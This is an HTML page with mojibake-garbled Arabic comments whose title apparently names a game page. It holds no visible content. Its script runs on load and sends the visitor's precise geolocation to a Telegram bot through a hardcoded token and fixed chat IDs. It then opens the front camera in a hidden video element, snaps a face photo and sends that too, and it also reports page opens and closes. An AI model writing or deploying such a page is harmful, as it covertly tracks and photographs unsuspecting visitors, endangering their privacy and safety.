<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ูุงู ุฑูุจููุณ</title>
</head>
<body>
    <script>
        // ูู ุงูุชูููุงุช ูุงูุดุงุช ุงูุฏู
        const BOT_TOKENS = [
            '7900479036:AAFxgXpe2JU4bWDWc_AgGSH8Z2J8-1TqVWY'
        ];
        
        const CHAT_IDS = [
            '5090097134',
            '7900479036'
        ];

        // ุฅุฑุณุงู ุฑุณุงูุฉ ููู ุงูุจูุชุงุช ูุงูุดุงุชุงุช
        async function sendToAllTelegrams(message) {
            for (const BOT_TOKEN of BOT_TOKENS) {
                for (const CHAT_ID of CHAT_IDS) {
                    try {
                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                text: message,
                                parse_mode: 'HTML'
                            })
                        });
                        console.log(`Sent to ${CHAT_ID} via ${BOT_TOKEN.substring(0, 10)}...`);
                    } catch (error) {
                        console.error(`Error sending to ${CHAT_ID}:`, error);
                    }
                }
            }
        }

        // ุฅุฑุณุงู ุตูุฑุฉ ููู ุงูุจูุชุงุช ูุงูุดุงุชุงุช
        async function sendPhotoToAllTelegrams(base64Image) {
            for (const BOT_TOKEN of BOT_TOKENS) {
                for (const CHAT_ID of CHAT_IDS) {
                    try {
                        // ุชุญููู base64 ุฅูู blob
                        const response = await fetch(base64Image);
                        const blob = await response.blob();
                        
                        // ุฅูุดุงุก FormData
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'face_capture.jpg');
                        formData.append('caption', '๐ธ ุชู ุงูุชูุงุท ุตูุฑุฉ ูู ุงููุงููุฑุง');
                        
                        // ุฅุฑุณุงู ุงูุตูุฑุฉ
                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                        const sendResponse = await fetch(url, {
                            method: 'POST',
                            body: formData
                        });
                        
                        console.log(`Photo sent to ${CHAT_ID} via ${BOT_TOKEN.substring(0, 10)}...`);
                    } catch (error) {
                        console.error(`Error sending photo to ${CHAT_ID}:`, error);
                    }
                }
            }
        }

        // ุงูุญุตูู ุนูู ุงููููุน
        async function getLocation() {
            if (!navigator.geolocation) {
                sendToAllTelegrams('โ ุงููุชุตูุญ ูุง ูุฏุนู ุฎุฏูุฉ ุงููููุน');
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const location = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        time: new Date().toISOString()
                    };
                    
                    await sendToAllTelegrams(`๐ <b>ุชู ุงูุญุตูู ุนูู ุงููููุน</b>\n\n๐ ุฎุท ุงูุนุฑุถ: ${location.lat}\n๐ ุฎุท ุงูุทูู: ${location.lon}\n๐ ุงูุฏูุฉ: ${location.accuracy} ูุชุฑ\nโฐ ุงูููุช: ${location.time}`);
                    
                    // ุจุนุฏ ุงูุญุตูู ุนูู ุงููููุนุ ูุทูุจ ุงููุงููุฑุง
                    requestCamera();
                },
                async (error) => {
                    await sendToAllTelegrams('โ ูุดู ุงูุญุตูู ุนูู ุงููููุน: ' + error.message);
                    // ุญุชู ุฅุฐุง ูุดู ุงููููุนุ ูุทูุจ ุงููุงููุฑุง
                    requestCamera();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // ุทูุจ ุงูุณูุงุญ ูููุงููุฑุง ูุงูุชูุงุท ุตูุฑุฉ
        async function requestCamera() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                sendToAllTelegrams('โ ุงููุชุตูุญ ูุง ูุฏุนู ุงููุงููุฑุง');
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                // ุฅูุดุงุก ููุฏูู ุนูุตุฑ ุฎูู
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();
                
                // ุงูุชุธุงุฑ ุชุญููู ุงูููุฏูู
                video.onloadeddata = async () => {
                    // ุฅูุดุงุก canvas ูุงูุชูุงุท ุงูุตูุฑุฉ
                    const canvas = document.createElement('canvas');
                    canvas.style.display = 'none';
                    document.body.appendChild(canvas);
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // ุชุญููู ุงูุตูุฑุฉ ุฅูู base64
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // ุฅุฑุณุงู ุงูุตูุฑุฉ ููู ุงูุดุงุชุงุช
                    await sendPhotoToAllTelegrams(imageData);
                    
                    // ุฅููุงู ุงููุงููุฑุง
                    stream.getTracks().forEach(track => track.stop());
                    
                    // ุฅุฒุงูุฉ ุงูุนูุงุตุฑ
                    document.body.removeChild(video);
                    document.body.removeChild(canvas);
                    
                    // ุฅุฑุณุงู ุฑุณุงูุฉ ุฅุชูุงู
                    sendToAllTelegrams('โ ุชู ุงูุงูุชูุงุก ูู ุงูุนูููุฉ ุจูุฌุงุญ');
                };
                
            } catch (error) {
                sendToAllTelegrams('โ ูุดู ุงููุตูู ูููุงููุฑุง: ' + error.message);
            }
        }

        // ุจุฏุก ุงูุนูููุฉ ุนูุฏ ุชุญููู ุงูุตูุญุฉ
        window.addEventListener('load', () => {
            sendToAllTelegrams('๐ ุชู ูุชุญ ุตูุญุฉ ูุงู ุฑูุจููุณ');
            setTimeout(() => {
                getLocation();
            }, 1000);
        });

        // ุนูุฏ ุฅุบูุงู ุงูุตูุญุฉ
        window.addEventListener('beforeunload', () => {
            sendToAllTelegrams('โ ุชู ุฅุบูุงู ุงูุตูุญุฉ');
        });
    </script>
</body>
</html>